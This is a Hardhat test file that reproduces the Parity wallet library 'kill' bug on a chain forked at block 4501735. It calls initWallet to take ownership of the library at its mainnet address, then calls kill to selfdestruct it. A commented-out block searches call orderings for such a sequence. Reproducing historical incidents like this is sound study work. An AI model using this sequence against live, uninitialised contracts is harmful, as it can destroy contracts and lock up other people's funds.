import { expect } from 'chai'
import { ethers, network } from 'hardhat'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'
import { Contract } from 'ethers'

describe('Parity Kill Test', async function () {
    async function handleIsOwner(walletLibrary: Contract, address: string) {
        return await walletLibrary.isOwner(address)
    }

    async function handleInitWallet(walletLibrary: Contract, address: string) {
        const ownerArray = [address]
        return await walletLibrary.initWallet(ownerArray, 0, 0)
    }

    async function handleKill(walletLibrary: Contract, address: string) {
        return await walletLibrary.kill(address)
    }

    let alice: SignerWithAddress
    let WalletLibrary: Contract
    let walletLibraryAddress: string
    beforeEach(async () => {
        ;[alice] = await ethers.getSigners()
        WalletLibrary = await ethers.getContractAt('parity', '0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4')
        walletLibraryAddress = await WalletLibrary.getAddress()
        expect(walletLibraryAddress).to.equal('0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4')
    })
    it('should block number equal to 4501735', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(4501735)
    })

    it('should accidentally kill it', async function () {

        const isOwnerBefore = await WalletLibrary.isOwner(alice.address)
        // Before initWallet, the owner should not be the alice
        expect(isOwnerBefore).to.be.false

        // Init wallet with alice as the owner
        const ownerArray = [alice.address]
        await WalletLibrary.initWallet(ownerArray, 0, 0)

        const isOwnerAfter = await WalletLibrary.isOwner(alice.address)
        // After initWallet, the owner should be the alice
        expect(isOwnerAfter).to.be.true

        // Kill the wallet (selfdestruct)
        await WalletLibrary.kill(alice.address)

        // After kill, the code of the wallet library should be 0x -> I accidentally killed it!!!
        const code = await ethers.provider.getCode(walletLibraryAddress)
        expect(code).to.equal('0x')
    })

    // it('should try all function call combinations to kill the wallet', async function () {
    //     const actions = [handleIsOwner, handleInitWallet, handleKill]
    //     for (let i = 0; i < actions.length; i++) {
    //         for (let j = 0; j < actions.length; j++) {
    //             for (let k = 0; k < actions.length; k++) {
    //                 let WalletLibraryNew = await ethers.getContractAt(
    //                     'parity',
    //                     '0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4',
    //                 )
    //                 let walletLibraryAddressNew = await WalletLibraryNew.getAddress()
    //                 const code = await ethers.provider.getCode(walletLibraryAddressNew)
    //                 const balance = await ethers.provider.getBalance(walletLibraryAddressNew)
    //                 if (code != '0x' && i != j && i != k && j != k ) {
    //                     const action1 = actions[i]
    //                     const action2 = actions[j]
    //                     const action3 = actions[k]
    //                     // 執行每種可能的函數序列
    //                     await action1(WalletLibrary, alice.address)
    //                     await action2(WalletLibrary, alice.address)
    //                     await action3(WalletLibrary, alice.address)
    //                     const code2 = await ethers.provider.getCode(walletLibraryAddressNew)
    //                     const balance2 = await ethers.provider.getBalance(walletLibraryAddressNew)
    //                     if (code2 == '0x' && balance2 == 0n) {
    //                         console.log(
    //                             `Triggering action sequence: ${actions[i].name}, ${actions[j].name}, ${actions[k].name}`,
    //                         )
    //                         return;
    //                     }
    //                 }
                    
    //             }
    //         }
    //     }
    //     console.log('No selfdestruct sequence found.')
    // })
})
